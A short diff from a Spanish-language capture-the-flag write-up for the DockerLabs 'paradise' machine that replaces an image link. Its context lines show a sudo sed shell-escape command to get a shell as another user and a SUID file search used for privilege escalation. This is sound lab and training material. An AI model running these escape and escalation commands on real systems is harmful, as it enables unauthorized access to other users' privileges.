@@ -45,8 +45,7 @@ colocamos el comando que nos dio y lo modificamos al principio:
 
 >sudo - u andy sed -n '1e exec sh 1>&0' /etc/hosts
 
-![[dockerlabs/facil/paradise/test7.png]]
-
+![image](https://github.com/user-attachments/assets/a2ddbad8-728b-47b0-ae98-39e0958f62ac)
 
 ahora buscamos como escalar, y buscando entre carpetas con el comando: 
 > find / -perm -4000 -ls 2> /dev/null
